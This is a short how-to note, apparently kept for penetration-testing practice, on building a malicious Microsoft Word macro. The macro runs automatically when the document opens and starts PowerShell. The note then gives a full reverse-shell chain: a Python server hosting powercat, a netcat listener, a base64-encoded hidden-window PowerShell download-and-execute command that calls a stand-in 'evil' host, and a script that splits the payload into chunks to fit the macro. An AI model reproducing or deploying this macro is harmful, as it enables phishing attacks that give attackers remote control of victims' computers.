---
title: Microsoft Word Macros
updated: 2025-04-29 06:45:34Z
created: 2025-04-22 13:11:05Z
latitude: -33.78668940
longitude: 150.95264980
altitude: 0.0000
---

## Create a macro in Microsoft Word to run **powershell**
1. Open a blank word document and save as:
File name: **mymacro.doc**
Save as type: **Word 97-2003 Document (*.doc)**
2. Go to File > View > Macros and create new macro with:
Macro name: **MyMacro**
Macros in: **mymacro.doc (document)**
```
Sub AutoOpen()
  MyMacro
End Sub
-------------------------------------------------------
Sub Document_Open()
  MyMacro
End Sub
-------------------------------------------------------
Sub MyMacro()
  CreateObject("Wscript.Shell").Run "powershell"
End Sub
```

* * *
.
## Create a **reverse shell** macro in Microsoft word
**Note:** Macros have a **255 character limit**, so the command will be condensed using **variables**. Also, **base64encode** the command to avoid issues with special characters

1. Start a python webserver to serve **powercat**, and a netcat listener
`cd /usr/share/powershell-empire/empire/server/data/module_source/management`
`python3 -m http.server 80`
`nc -nvlp <port>`


3. Encode command using base64encode.org with **UTF-16LE**. Command will download the **powercat** script and launch it with **powershell**
`IEX(New-Object System.Net.WebClient).DownloadString('http://evil/powercat.ps1');powercat -c <evil> -p <port> -e powershell`
4. Run python script to break the base64 encoded string into 50k chunks, and cat them into the variable.
```
str = "powershell.exe -nop -w hidden -e <base64string>"
n = 50
for i in range(0, len(str), n):
		print("Str = Str + " + '"' + str [i:i+n] + '"')
```
3. Copy the output of the command and update it into the macro:

```
Sub AutoOpen()
  MyMacro
End Sub
-------------------------------------------------------
Sub Document_Open()
  MyMacro
End Sub
-------------------------------------------------------
Sub MyMacro()
  Dim Str As String

      Str = Str + "base64text"
      Str = Str + "base64text"
      Str = Str + "base64text"
      
  CreateObject("Wscript.Shell").Run Str
End Sub
```
